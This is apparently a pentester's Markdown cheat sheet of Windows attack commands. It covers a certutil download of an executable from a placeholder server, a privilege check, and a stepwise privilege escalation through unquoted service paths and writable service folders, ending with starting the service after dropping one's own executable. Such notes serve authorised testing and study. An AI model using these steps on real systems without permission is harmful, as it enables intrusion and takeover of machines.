# Windows Snippets

wget for Windows:
```
certutil.exe -urlcache -f http://SERVER/FILE.exe OUTFILE.exe
```

check for impersonate privs and other privs:
```
whoami /priv
```

Run `dir` recursively:
```
gci -recurse .
```
# Exploiting Windows Services
Listing services for weak perms and unquoted service paths ([link](https://www.hackingarticles.in/windows-privilege-escalation-weak-services-permission/))
```
wmic service get name,startname,pathname
```
```
sc qc SERVICENAME # Check if BINARY_PATH_NAME calls an unquoted service path and see if is a priv esc opp
```
```
./accesschk /accepteula -uwdq "C:\DIR\FROM\ABOVE" # check write perms of a subdir of BINARY_PATH_NAME so we can commandeer the service call w our own executable
```
```
net start SERVICENAME # start the service after dropping our executable into the path
```

Kernel Priv Esc:
- save `systeminfo` output and run through the [Windows Exploit Suggester_new](https://github.com/bitsadmin/wesng)


## Tips
1. https://github.com/ankh2054/windows-pentest
